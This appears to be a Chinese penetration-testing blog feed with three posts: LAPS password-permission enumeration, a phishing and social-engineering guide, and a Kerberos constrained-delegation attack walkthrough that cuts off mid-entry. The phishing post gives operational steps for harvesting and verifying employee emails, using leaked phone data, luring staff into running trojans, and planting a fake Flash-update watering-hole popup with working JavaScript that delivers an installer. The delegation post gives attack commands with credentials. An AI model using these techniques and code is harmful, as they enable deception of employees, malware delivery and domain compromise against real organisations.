src="/img/laps/15054f83-f716-448a-96e0-3b9fa4a63729.png" alt="img"></p><p>查询lapsComputers这个OU的访问权限，可以看到目前只有域机器system权限和域管可以访问</p><pre><code>Find-AdmPwdExtendedRights -Identity lapsComputers | Format-Table -AutoSizeFind-AdmPwdExtendedRights -Identity &quot;OU=lapsComputers,DC=Motoo,DC=nc&quot; | Format-Table -AutoSize</code></pre><p><img src="/img/laps/2e624156-bdc6-494d-a2ea-73c1d5c367b7.png" alt="img"></p><p><img src="/img/laps/8e47f1c5-6c1f-44d1-bae3-21d9d27a2931.png" alt="img"></p><p>使用以下命令授予计算机修改本机ms-Mcs-AdmPwdExpirationTime 和 ms-Mcs-AdmPwd这两个扩展属性的权限。</p><pre><code>Set-AdmPwdComputerSelfPermission -OrgUnit lapsComputers</code></pre><p><img src="/img/laps/208df236-fd47-4f17-9fbf-fd8749c6dbcc.png" alt="img"></p><p>使用以下命令设置读取组织lapsComputers里的计算机扩展属性的权限组为lapsAdmins</p><pre><code>Set-AdmPwdReadPasswordPermission -OrgUnit lapsComputers -AllowedPrincipals lapsAdmins</code></pre><p><img src="/img/laps/87ccb97d-2d29-4329-ab22-c38707dac924.png" alt="img"></p><p>可以看到成功多了Motoo\lapsAdmins组</p><p><img src="/img/laps/46bd3eb0-d9d7-47fd-9d1e-82d8765870cd.png" alt="img"></p><p>使用以下命令设置重置密码的权限组为LAPAdmins</p><pre><code>Set-AdmPwdResetPasswordPermission -OrgUnit lapsComputers -AllowedPrincipals lapsAdmins</code></pre><p><img src="/img/laps/e71de080-08fa-48ff-b202-074440f24b9e.png" alt="img"></p><p><img src="/img/laps/d6fdfc9f-f28d-4a72-bb1b-119cfa21a7e6.png" alt="img"></p><h2 id="0x03-创建两条组策略链接到创建的OU上"><a href="#0x03-创建两条组策略链接到创建的OU上" class="headerlink" title="0x03 创建两条组策略链接到创建的OU上"></a>0x03 创建两条组策略链接到创建的OU上</h2><pre><code>lapsAdminUsers组织创建组策略install laps           目的：当lapsAdminUsers组织里的域用户登录时，通过组策略安装lapslapsComputers组织创建组策略set laps                目的：当域用户登陆后成功安装了laps后，通过组策略自动修改本地管理员密码</code></pre><p>打开域组策略gpmc.msc，启动组策略管理控制台，右键单击该域，然后单击“ 在此域中创建 GPO并在此处链接”。为GPO提供一个名称。</p><h3 id="0x03-1-lapsAdminUsers组织创建组策略install-laps"><a href="#0x03-1-lapsAdminUsers组织创建组策略install-laps" class="headerlink" title="0x03-1 lapsAdminUsers组织创建组策略install laps"></a>0x03-1 lapsAdminUsers组织创建组策略install laps</h3><p>在lapsAdminUsers的组织里新建一个组策略</p><p><img src="/img/laps/7f93f76b-9304-48e0-af0e-6490f265f358.png" alt="img"></p><p><img src="/img/laps/bd6a7356-251a-494e-a910-719c60f898fc.png" alt="img"></p><p>同时在\Motoo.nc\SYSVOL\Motoo.nc\Policies路径下多了该文件夹</p><p><img src="/img/laps/b1a91f02-8043-4602-bd57-1b8e369c4053.png" alt="img"></p><p>将laps安装包放到该文件夹下的Machine</p><p><img src="/img/laps/7d3aa3fc-2305-4ccc-a1d6-54d030a19ade.png" alt="img"></p><p>编辑组策略install laps</p><p><img src="/img/laps/1434a2e8-7f85-4edb-80ee-3257a03aad67.png" alt="img"></p><p>选择安装包</p><p><img src="/img/laps/513a7d0d-e34e-4024-9dc7-21bb5abc61f1.png" alt="img"></p><p>安装包只能是msi</p><p><img src="/img/laps/d07bfb9e-60ee-485d-b448-8d65947f2be9.png" alt="img"></p><p>选择指派</p><p><img src="/img/laps/571ee35d-2441-4d2a-ac70-9d8d63e024f6.png" alt="img"></p><p>成功指向共享文件里的msi安装包</p><p><img src="/img/laps/ec1b1ad8-8461-42df-b242-8ecc3f10727f.png" alt="img"></p><p>当域用户登录桌面的时候，就会自动安装。如果已经安装过了则不会再安装了。</p><p><img src="/img/laps/2cd9072a-effb-42b6-b969-bc0050cc12cf.png" alt="img"></p><h3 id="0x03-2-lapsComputers组织创建组策略set-laps"><a href="#0x03-2-lapsComputers组织创建组策略set-laps" class="headerlink" title="0x03-2 lapsComputers组织创建组策略set laps"></a>0x03-2 lapsComputers组织创建组策略set laps</h3><p><img src="/img/laps/cf3cc113-ebfa-454a-b61b-0d2c2cc6d4c9.png" alt="img"></p><p><img src="/img/laps/aec206ed-3731-4aa9-92f3-cf923602ef3c.png" alt="img"></p><p>密码的设置，提供了多种复杂度的组合方式、密码长度和密码重置周期的设置。</p><p><img src="/img/laps/4f7b9405-b011-4bf7-9660-bad685319716.png" alt="img"></p><p>接下来是输入本地管理员的用户名,如果你修改的不是内置的Administrator，请在这里指定你希望修改的用户名，在未配置的情况下默认为内置的Administrator。</p><p><img src="/img/laps/854d33f5-65af-417d-aec4-fd69c110b398.png" alt="img"></p><p>接下来这一项是为了重置周期与密码有效期策略配合使用的设置。因为很多公司都有自己的密码过期策略，启用这一项可以避免两个配置发生冲突。</p><p><img src="/img/laps/1c6887c6-d170-4a51-af85-bf36c120191d.png" alt="img"></p><p>最后一项启用配置后确认对本地管理员密码开始进行设置。</p><p><img src="/img/laps/92bdc0aa-6729-469a-a184-e26a4c5f6003.png" alt="img"></p><h2 id="0x04-通过ldap查看laps的明文密码"><a href="#0x04-通过ldap查看laps的明文密码" class="headerlink" title="0x04 通过ldap查看laps的明文密码"></a>0x04 通过ldap查看laps的明文密码</h2><p>使用lapsAdminUsers组织里的lapsAdmins组里的成员lidan登录lapsComputers机器</p><p>可以看到登陆的时候显示正在安装laps</p><p><img src="/img/laps/7bbc7e74-12fc-4926-9ccb-cee566fcf8bb.png" alt="img"></p><p>通过lidan域用户或者域管用户查看ldap，选择lapsComputers里的域机器，可以看到本地管理员administrator的随机明文密码</p><p><img src="/img/laps/390f5927-8b8a-4b7e-9d47-47af4a0c3c5a.png" alt="img"></p><p>如果使用非lapsAdminsUsers组织lapsAdmins组里的域用户查看ldap，是看不到的密码的，只能看到是什么时候修改的</p><p><img src="/img/laps/536d59df-46a1-4ad5-8d67-d43f085ec333.png" alt="img"></p><h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h2><h3 id="0x05-1-grouper2-导出组策略"><a href="#0x05-1-grouper2-导出组策略" class="headerlink" title="0x05-1 grouper2 导出组策略"></a>0x05-1 grouper2 导出组策略</h3><p>当我们遇到域环境时，先通过grouper2导出组策略看是否有laps</p><p>Grouper2.exe -d Motoo.nc -u liwei -p 1qaz@WSX -t 100 -f out.html</p><p><img src="/img/laps/1a93bd96-83b2-4d88-9fa9-ec4d9e8bd3d4.png" alt="img"></p><p>打开out.html，全局搜索laps</p><p><img src="/img/laps/005342bb-0a41-40bb-b3d2-f62d36aafb3c.png" alt="img"></p><p>通过uid可以找到laps链接到哪个组织</p><p><img src="/img/laps/3c6d0c63-2aab-413a-acf1-9a95ddd7f000.png" alt="img"></p><h3 id="0x05-2-LAPSTOOlkit工具寻找laps漏洞"><a href="#0x05-2-LAPSTOOlkit工具寻找laps漏洞" class="headerlink" title="0x05-2 LAPSTOOlkit工具寻找laps漏洞"></a>0x05-2 LAPSTOOlkit工具寻找laps漏洞</h3><pre><code>github : https://github.com/leoloobeek/LAPSToolkit/archive/master.zip显示全部启用了LAPS和密码扩展的计算机设备。get-help Get-LAPSComputers查询所有的OU并检测哪一个活动目录组可读取ms-Mcs-AdmPwd属性。get-help Find-LAPSDelegatedGroups       使用了get-NetOU针对每一个启用了LAPS的活动目录计算机，进行扩展权限分析，并查找哪一个用户组拥有AD读取权限，以及其中的用户是否具有“全部扩展权限”。系统管理员可能不知道哪一个具有“全部扩展权限”的用户可以查看密码，以及用户组中的哪一个用户安全等级比较低。这个功能可以针对每一个AD设备解析ACL权限，但对于范围比较大的域，解析时间会比较久。get-help Find-AdmPwdExtendedRights      使用了get-objectAcl原理​```Get-NetComputer -ComputerName &#39;LAPSCLIENT.test.local&#39; -FullData |Select-Object -ExpandProperty distinguishedname |ForEach-Object { $_.substring($_.indexof(&#39;OU&#39;)) } | ForEach-Object {  Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_} | Where-Object {  ($_.ObjectType -like &#39;ms-Mcs-AdmPwd&#39;) -and  ($_.ActiveDirectoryRights -match &#39;ReadProperty&#39;)} | ForEach-Object {  Convert-NameToSid $_.IdentityReference} | Select-Object -ExpandProperty SID | Get-ADObject​```首先，我们将获取Get-NetComputer -FullData的完整数据对象。然后，我们提取并扩展 distinguishedname属性，找到“ OU”的索引，然后仅返回字符串的该部分。我们在这里所做的只是枚举特定计算机所属的OU。接下来，我们使用Get-ObjectAcl枚举该指定OU的ACL， 并使用-ResolveGUIDs将GUID解析为通用显示名称。然后，我们过滤权限条目，仅返回那些在ms-Mcs-AdmPwd字段上包含读取权限的条目 。我们无法确定从IdentityReference字段返回的名称 是组还是用户，因此我们可以使用PowerView的 Convert-NameToSid cmdlet将对象转换为直接安全标识符（SID），然后将其最终传递给 Get -ADObject返回具有对该字段的读取权限的完整活动目录用户/组对象。从结果中我们可以看到，“ LAPS_recover”域组被授予读取权限。现在，如果我们想枚举所有LAPS应用程序，并且谁拥有对它们的读取权限，该怎么办？由于最近对Get-ObjectACL的参数流水线进行了一些优化，因此比以往任何时候都更容易​```Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object {  ($_.ObjectType -like &#39;ms-Mcs-AdmPwd&#39;) -and   ($_.ActiveDirectoryRights -match &#39;ReadProperty&#39;)} | ForEach-Object {  $_ | Add-Member NoteProperty &#39;IdentitySID&#39; $(Convert-NameToSid $_.IdentityReference).SID;  $_}​```</code></pre><p>查询哪些机器使用了laps</p><pre><code>Get-LAPSComputers</code></pre><p><img src="/img/laps/69a50a66-840f-4f70-af87-19189c50f8dd.png" alt="img"></p><p>查询所有的OU并检测哪一个活动目录组可读取ms-Mcs-AdmPwd属性。</p><pre><code>import-module .\LAPSToolkit.ps1Find-LAPSDelegatedGroups</code></pre><p><img src="/img/laps/4775375f-394e-4877-adbb-ffcde56bf976.png" alt="img"></p><p><strong>从上图结果得知，lapsAdmins组里的用户可以读取lapsComputers组织里的所有域机器的本地管理员密码</strong></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><pre><code>http://drops.xmd5.com/static/drops/tips-10496.htmlhttp://tech.canway.net/news/164.htmlhttp://www.harmj0y.net/blog/powershell/running-laps-with-powerview/</code></pre>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LAPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼与社工系列之寻鱼</title>
      <link href="/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-xun-yu/"/>
      <url>/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-xun-yu/</url>
      
        <content type="html"><![CDATA[<h1 id="钓鱼与社工系列之寻鱼"><a href="#钓鱼与社工系列之寻鱼" class="headerlink" title="钓鱼与社工系列之寻鱼"></a>钓鱼与社工系列之寻鱼</h1><h2 id="0x01-广撒网"><a href="#0x01-广撒网" class="headerlink" title="0x01 广撒网"></a>0x01 广撒网</h2><p>从互联网中收集目标员工邮箱，发送钓鱼邮件</p><h3 id="0x01-1-邮箱收集-theHarvester"><a href="#0x01-1-邮箱收集-theHarvester" class="headerlink" title="0x01-1 邮箱收集-theHarvester"></a>0x01-1 邮箱收集-theHarvester</h3><p>这里推荐使用theHarvester脚本收集邮箱</p><pre><code>https://github.com/laramies/theHarvester</code></pre><p>语法：-d参数指向目标的域名，-b all是用调用theHarvester的所有模板查找邮箱</p><pre><code>python3 theHarvester.py -d xxx.com -b all</code></pre><p><img src="/img/fish/7c321a3d-e2c7-492c-9079-621e2fc032c0.png" alt="img"></p><h3 id="0x01-2-邮箱收集-搜索引擎"><a href="#0x01-2-邮箱收集-搜索引擎" class="headerlink" title="0x01-2  邮箱收集-搜索引擎"></a>0x01-2  邮箱收集-搜索引擎</h3><pre><code>微匹：http://www.veryvp.com/hunter: https://hunter.io/search/domain.comskymem: https://www.skymem.info/</code></pre><p><img src="/img/fish/05cd1a41-ad6b-405c-8bbb-286382a65113.png" alt="img"></p><p><img src="/img/fish/86b65aa3-af79-4e50-bd85-aca4910bf051.jpg" alt="img"></p><p><img src="/img/fish/f404f8ce-3cda-4f91-bfc3-8f3eabfba2d5.png" alt="img"></p><h3 id="0x01-3-邮箱收集-验证邮箱有效性"><a href="#0x01-3-邮箱收集-验证邮箱有效性" class="headerlink" title="0x01-3  邮箱收集-验证邮箱有效性"></a>0x01-3  邮箱收集-验证邮箱有效性</h3><p>收集到邮箱后，可以先验证邮箱是否真实有效，通过以下的脚本验证邮箱的真实性，脚本在文章末尾。</p><p><img src="/img/fish/89aad28f-1374-43c3-9766-3d83017e820b.png" alt="img"></p><p>然后对这些真实存在的邮箱发送钓鱼邮件即可。</p><p>邮件内容要能吸引员工兴趣，最好是关乎到他们的利益，这样才能诱导他们查看。</p><p>并且设置自己的邮箱昵称与目标相关，例如：行政服务部</p><h3 id="0x01-4-QQ等第三方邮箱发送钓鱼邮件"><a href="#0x01-4-QQ等第三方邮箱发送钓鱼邮件" class="headerlink" title="0x01-4 QQ等第三方邮箱发送钓鱼邮件"></a>0x01-4 QQ等第三方邮箱发送钓鱼邮件</h3><p><img src="/img/fish/9aa41b3f-fb07-406b-8341-6f494d2f41d7.jpg" alt="img"></p><p><img src="/img/fish/e8f6a74b-57c5-426f-9577-4c673cc32b33.png" alt="img"></p><h3 id="0x01-5-目标员工邮箱"><a href="#0x01-5-目标员工邮箱" class="headerlink" title="0x01-5 目标员工邮箱"></a>0x01-5 目标员工邮箱</h3><p>使用目标员工的邮箱发送马，不用考虑邮件网关导致发不进去</p><p><img src="/img/fish/9194e784-f2b8-4c98-bf0e-49bb6ff9dfdf.jpg" alt="img"></p><h3 id="0x01-6-OA办公系统"><a href="#0x01-6-OA办公系统" class="headerlink" title="0x01-6 OA办公系统"></a>0x01-6 OA办公系统</h3><p>OA办公系统可以获取目标大量员工联系方式，对一些安全意识薄弱的部门员工发送“非常重要”的消息。</p><p><img src="/img/fish/b12ddace-ada5-43ac-bbc3-f000ea0abf44.jpg" alt="img"></p><h2 id="0x02-定向钓鱼（制作对应鱼饵）"><a href="#0x02-定向钓鱼（制作对应鱼饵）" class="headerlink" title="0x02 定向钓鱼（制作对应鱼饵）"></a>0x02 定向钓鱼（制作对应鱼饵）</h2><h3 id="0x02-1-对收集到的邮箱用户定向钓鱼"><a href="#0x02-1-对收集到的邮箱用户定向钓鱼" class="headerlink" title="0x02-1 对收集到的邮箱用户定向钓鱼"></a>0x02-1 对收集到的邮箱用户定向钓鱼</h3><p>通过tg的社工库查邮箱获取手机号，再通过手机号添加微信定向社工。</p><p>下图是我通过qq邮箱发送钓鱼邮件后，如果邮箱存在，则会显示已投递到对方邮箱，如果邮箱不存在，则显示投递失败，已退信。</p><p>通过该方法，也可以判断邮箱是否有效。</p><p><img src="/img/fish/cb1d45bb-5c0e-4275-af44-52ec2873526a.png" alt="img"></p><p>通过qq邮箱发送，还有一个好处，就是有些用户会设置自动回复或者回复了我们的邮件，那么这时候就可以获取到该用户的一些信息。</p><p><img src="/img/fish/a8636bec-8890-4188-b7f2-a05d5d96d308.png" alt="img"></p><p><img src="/img/fish/84045831-d7bb-4473-9ec5-45bcd561d4fa.png" alt="img"></p><p>从收集到的邮箱中中选择了lining9用户的邮箱，在tg中找到了该邮箱泄露的信息，我们应该关注的重点信息是手机号</p><p><img src="/img/fish/ec4df603-0ad9-49fb-ad49-29e72057f935.png" alt="img"></p><p>然后通过微信小号查找该手机号，并添加对方为好友。</p><p>这里我直接报对方的名字和邮箱号，一是可以判断是否加错，二是获取对方的信任。</p><p><img src="/img/fish/3897192d-127c-4176-91d0-3c3722aeee04.png" alt="img"></p><p>制作和目标相关的木马，这个需要先去了解目标的情况。</p><p>这里我是调查了他们员工都是用了一种安全桌面客户端，所以我就伪装自己是公司的技术部门，让他更新补丁，于是将马发送给他后，不一会儿就上线到CS了。</p><p><img src="/img/fish/e05740f7-8504-41e4-832f-11756649f22d.png" alt="img"></p><h3 id="0x02-2-通过关键字寻找鱼并定向钓鱼"><a href="#0x02-2-通过关键字寻找鱼并定向钓鱼" class="headerlink" title="0x02-2 通过关键字寻找鱼并定向钓鱼"></a>0x02-2 通过关键字寻找鱼并定向钓鱼</h3><p>举个例子，通用关键字有： 联系方式、简历、招聘、应聘、贷款、手机号、邮箱 等等</p><p>对于一些特殊行业，那么可以自己联想关键字，例如 投标、招标、投诉 等等</p><p>自己发挥想象，各种关键字相互组合。</p><pre><code>目标名字&quot;XXXX&quot;  联系方式        投递简历        hr        招聘        应聘        贷款        手机号</code></pre><p><img src="/img/fish/485c876c-bf8b-4d2d-b6a7-a350bb1221f0.jpg" alt="img"></p><p><img src="/img/fish/83aa07fe-3b6d-4ec6-acca-4cc9709038a2.jpg" alt="img"></p><p>制作一个应聘简历马，然后发过去就可以了。</p><p><img src="/img/fish/44eae351-55e2-4bb6-8733-fb2c659400f6.jpg" alt="img"></p><h3 id="0x02-3-在线客服"><a href="#0x02-3-在线客服" class="headerlink" title="0x02-3 在线客服"></a>0x02-3 在线客服</h3><p>一些企业或者金融行业，他们的网站都有在线客服功能。那么可以通过人工服务去定向社工。</p><p>例如：在线客服处有上传文件的功能，那么就将我们的马直接传上去，诱导客服运行。</p><p>或者就想办法加这些客服人员的微信，具体的话术自己构造。</p><p><img src="/img/fish/50155984.png" alt="img"></p><p>上图中的马的名字也是有根据的，我是在他们的网站上找到下面的信息，然后问客服打不开文件是什么原因。诱导客服尝试打开我们的马。</p><p><img src="/img/fish/26a19d19-5db1-4a75-9359-b8b7a5b5f1ef.png" alt="img"></p><h3 id="0x02-4-水坑"><a href="#0x02-4-水坑" class="headerlink" title="0x02-4 水坑"></a>0x02-4 水坑</h3><p>前提：拿下了webshell后，在webshell中植入下面的项目。</p><pre><code>https://github.com/r00tSe7en/Flash-Pop</code></pre><p>效果：当有人第一次访问时，会触发下图的弹框，诱导访问者点击立即升级，这时候会跳转到我们的Flash木马地址自动下载。当访问者点击安装了木马后，就会上线到远控端。然后将访问者的浏览器设置一个cookies，避免访问者刷新后又弹框。这样就不会触发访问者的警觉了，误以为安装了Flash后就可以了。</p><p><img src="/img/fish/f02b1d44-d657-425d-815f-82803520ade0.jpg" alt="img"></p><p>验证邮箱真实性脚本</p><pre><code>&#39;&#39;&#39;在线验证邮箱真实性&#39;&#39;&#39;import randomimport smtplibfrom termcolor import cprintimport dns.resolverimport timefrom queue import Queuefrom threading import Thread# 查询邮件服务器def get_mailServer(server):    print(&#39;查找[{}]邮箱服务器...&#39;.format(server))    try:        answers = dns.resolver.query(server, &#39;MX&#39;)        res = [str(rdata.exchange)[:-1] for rdata in answers]        print(&#39;\t[{}]邮件服务器：{}&#39;.format(server, res))        return res    except Exception as e:        print(&#39;\t[error] : {}&#39;.format(e.args))        return []# 判断邮箱是否存活def checkEmail(mailServers, emails_queue, aliveEmails):    try:        mailServer = random.choice(mailServers)        print(&#39;\t连接服务器:{}&#39;.format(mailServer))        s = smtplib.SMTP(mailServer, timeout=10)    except Exception as e:        print(&#39;\t[error] : {}&#39;.format(e.args))        return    while not emails_queue.empty():        email = emails_queue.get()        num = emails_queue.qsize()        try:            helo = s.docmd(&#39;HELO chacuo.net&#39;)            # print(helo)   # (250, b&#39;Forcepoint email protection service&#39;)            send_from = s.docmd(&#39;MAIL FROM:&lt;test@test.test&gt;&#39;)            # print(send_from)  # (250, b&#39;2.1.0 Ok&#39;)            send_from = s.docmd(&#39;RCPT TO:&lt;%s&gt;&#39; % email)            # print(send_from)  # (550, b&#39;5.1.1 Error: invalid recipients is found from 101.68.81.227&#39;) 或者 (250, b&#39;2.1.5 Ok&#39;)            if send_from[0] == 250 or send_from[0] == 451:                # final_res[email] = True  # 存在                cprint(&#39;\t[{}] [+] {}&#39;.format(num, email), &#39;red&#39;)                aliveEmails.append(email)            elif send_from[0] == 550:                # final_res[email] = False  # 不存在                print(&#39;\t[{}] [-] {} 不存在&#39;.format(num, email))            elif send_from[0] == 503:                cprint(&#39;\t[{}] [-] {} code = 503 重新连接邮件服务器{}&#39;.format(num, email, mailServer))                s.close()                time.sleep(10)                try:                    s = smtplib.SMTP(mailServer, timeout=10)                except Exception as e:                    s.close()                    time.sleep(10)                    s = smtplib.SMTP(mailServer, timeout=10)                helo = s.docmd(&#39;HELO chacuo.net&#39;)                send_from = s.docmd(&#39;MAIL FROM:&lt;test@test.test&gt;&#39;)                send_from = s.docmd(&#39;RCPT TO:&lt;%s&gt;&#39; % email)                if send_from[0] == 250 or send_from[0] == 451:                    cprint(&#39;\t[{}] [+] {}&#39;.format(num, email), &#39;red&#39;)                    aliveEmails.append(email)                elif send_from[0] == 550:                    print(&#39;\t[{}] [-] {}&#39;.format(num, email))            else:                # final_res[email] = None  # 未知                print(&#39;\t[{}] [-] {} : {} : {}&#39;.format(num, email, send_from[0], send_from))        except Exception as e:            print(&#39;\t[{}] [error] {} : {}&#39;.format(num, email, e.args))            s.close()            try:                s = smtplib.SMTP(mailServer, timeout=10)            except Exception as e:                s.close()                time.sleep(10)                s = smtplib.SMTP(mailServer, timeout=10)    s.close()def run(emails):    Server_emails = {}          aliveEmails = []    # 存活的emails    for email in emails:        name, server = email.split(&#39;@&#39;)        if Server_emails.get(server):            Server_emails[server].append(email)        else:            Server_emails[server] = [email]    print(Server_emails)    for server in Server_emails:        mailServers = get_mailServer(server)        if mailServers:            emailsNums = len(Server_emails[server])            emails_queue = Queue(-1)            for email in Server_emails[server]:                emails_queue.put(email)            threads = []            for i in range(5):                t = Thread(target=checkEmail, args=(mailServers, emails_queue, aliveEmails))                threads.append(t)                t.start()            for t in threads:                t.join()    return aliveEmailsdef run_verifyEmails(emails):    aliveEmails = run(emails)    return aliveEmailsif __name__ == &#39;__main__&#39;:    emails = []    with open(&#39;mail.txt&#39;, &#39;rt&#39;) as f:        for each in f.readlines():            emails.append(each.strip())    aliveEmails = run_verifyEmails(emails)    print(aliveEmails)</code></pre><p>flash.js新增代码，通过新增cookeis避免多次弹框：</p><pre><code>function setCookie(cname,cvalue,exdays) {  var d = new Date();  d.setTime(d.getTime() + (exdays*24*60*60*1000));  var expires = &quot;expires=&quot; + d.toGMTString();  document.cookie = cname + &quot;=&quot; + cvalue + &quot;;&quot; + expires + &quot;;path=/&quot;;}function getCookie(cname) {  var name = cname + &quot;=&quot;;  var decodedCookie = decodeURIComponent(document.cookie);  var ca = decodedCookie.split(&#39;;&#39;);  for(var i = 0; i &lt; ca.length; i++) {    var c = ca[i];    while (c.charAt(0) == &#39; &#39;) {      c = c.substring(1);    }    if (c.indexOf(name) == 0) {      return c.substring(name.length, c.length);    }  }  return &quot;&quot;;}var download666 = function() {    setCookie(&quot;username1&quot;, &quot;True&quot;, 30);    setTimeout(&quot;location.href=&#39;./&#39;&quot;, 500 );    setTimeout(&quot;localStorage.setItem(&#39;isUpdate&#39;, &#39;1&#39;);&quot;, 500 );    window.open(&#39;./autoinstall/flashplayerpp_install_cn.exe&#39;);}function checkCookie() {    var user=getCookie(&quot;username1&quot;);    if (user == &quot;&quot;) {        document.write(&quot;&lt;script src=&#39;./layer/jquery.min.js&#39;&gt;&lt;/script&gt;&quot;);        document.write(&quot;&lt;script src=&#39;./layer/layer.js&#39;&gt;&lt;/script&gt;&quot;);        window.onload = function(){            layer.open({                type: 1,                move: false ,                area: [&#39;613px&#39;, &#39;328px&#39;],                title: false,                shade: 0.6,                //maxmin: true ,                anim: 1,                offset: &#39;100px&#39;,                scrollbar: false,                content: &#39;&lt;a href=&quot;javascript:;&quot; onclick=&quot;download666()&quot;&gt;&lt;img src=&quot;./flash.jpg&quot;&gt;&lt;/a&gt;&#39;//创建图像            });        }    }}checkCookie();</code></pre>]]></content>
      
      
      <categories>
          
          <category> 钓鱼与社工 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钓鱼与社工系列之寻鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>约束委派利用</title>
      <link href="/2020/11/25/yue-shu-wei-pai-li-yong/"/>
      <url>/2020/11/25/yue-shu-wei-pai-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="0x09-约束委派利用"><a href="#0x09-约束委派利用" class="headerlink" title="0x09-约束委派利用"></a>0x09-约束委派利用</h1><h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h2><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><pre><code>《AD域用户加域委派》https://wenku.baidu.com/view/5cd12c2adc36a32d7375a417866fb84ae45cc32b.html《域渗透——Kerberos委派攻击》     -- 主要是这篇文章https://xz.aliyun.com/t/7217#toc-9《利用域委派获取域管理权限》https://www.anquanke.com/post/id/92484《微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）》https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw《这是一篇“不一样”的真实渗透测试案例分析文章》https://cloud.tencent.com/developer/article/1601095</code></pre><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><pre><code>借用Klion的环境域控：192.168.3.142域机器：Srv-DB-0day域机器：PC-jerry-0day服务账号:0day\sqlsvr Admin12345工具：ADFind.exe      查找域中配置约束委派用户kekeo.exe       请求TGT，获取STmimikatz        导入ST，获取权限</code></pre><h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动</p><p>委派主要分为非约束委派(Unconstrained delegation)和约束委派(Constrained delegation)两个方式，还有一种是基于资源的约束委派（Resource Based Constrained Delegation）</p><pre><code>非约束性委派（Unconstrained Delegation）服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户访问任意服务。举例说明，如果某个服务A的服务账号B被设置为非约束委派，当用户C通过Kerberos认证访问服务A时，KDC会检查服务账号B的属性，发现是非约束性委派时，KDC会将用户C的TGT放在TGS中，这样B在验证TGS的同时获取了A用户的TGT，从而可以模拟用户A访问任意服务。从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。</code></pre><pre><code>约束性委派（Constrained Delegation）即Kerberos的扩展协议S4U2Proxy，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务；</code></pre><h3 id="服务账号、主机账号、普通账号"><a href="#服务账号、主机账号、普通账号" class="headerlink" title="服务账号、主机账号、普通账号"></a>服务账号、主机账号、普通账号</h3><p>在Windows系统中，普通用户的属性中没有委派（Delegation）这个选项卡，只有服务账号、主机账号才有。</p><p>服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。</p><p>服务账号：⬇</p><p><img src="/img/delegation/2a7151ab-7283-4ec3-bb6d-61b1da116eba.png" alt="img"></p><p>主机账号：⬇</p><p><img src="/img/delegation/862a6496-aa6d-4e53-89c0-915a769c5848.png" alt="img"></p><p>普通账号：⬇</p><p><img src="/img/delegation/368b1b91-3985-4ec8-9b95-7b09c1b431ec.png" alt="img"></p><h2 id="0x02-约束委托利用"><a href="#0x02-约束委托利用" class="headerlink" title="0x02 约束委托利用"></a>0x02 约束委托利用</h2><p>模拟环境，在域机器：PC-jerry-0day上</p><h3 id="1-查找域中配置约束委派用户"><a href="#1-查找域中配置约束委派用户" class="headerlink" title="1. 查找域中配置约束委派用户"></a>1. 查找域中配置约束委派用户</h3><pre><code>AdFind.exe -h 192.168.3.142 -u sqlsvr -up Admin12345 -b &quot;DC=0day,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</code></pre><p><img src="/img/delegation/c655de04-feac-4072-96ed-1cb59df6970d.png" alt="img"></p><p>那么当我们获取了sqlsvr域用户的账号密码后，就可以登录查出来的任意域机器</p><p>先查询下Srv-DB-0day域机器的管理组，使用服务账号建立IPC连接，用local查询本地管理组。可以看到sqlsvr并不能对Srv-DB-0day域机器有操作权限</p><p><img src="/img/delegation/ffe5a7ac-d47b-464f-8e7c-97ef90400c13.png" alt="img"></p><h3 id="2-用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST"><a href="#2-用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST" class="headerlink" title="2. 用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST"></a>2. 用kekeo请求该用户的TGT，使用这张TGT获取域机器的ST</h3><pre><code>kekeo.exetgt::ask /user:sqlsvr /domain:0day.org /password:Admin12345 /ticket:administrator.kirbitgs::s4u /tgt:TGT_sqlsvr@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi /user:Administrator@0day.org /service:cifs/Srv-DB-0day.0day.org</code></pre><p>用kekeo请求该用户的TGT</p><p>tgt::ask /user:sqlsvr /domain:0day.org /password:Admin12345 /ticket:administrator.kirbi</p><p>/user: 服务用户的用户名</p><p>/password: 服务用户的明文密码</p><p>/domain: 所在域名</p><p>/ticket: 指定票据名称，不过这个参数没有生效，可以忽略</p><p>得到服务用户TGT：<a href="mailto:TGT_sqlsvr@0DAY.ORG_krbtgt" target="_blank" 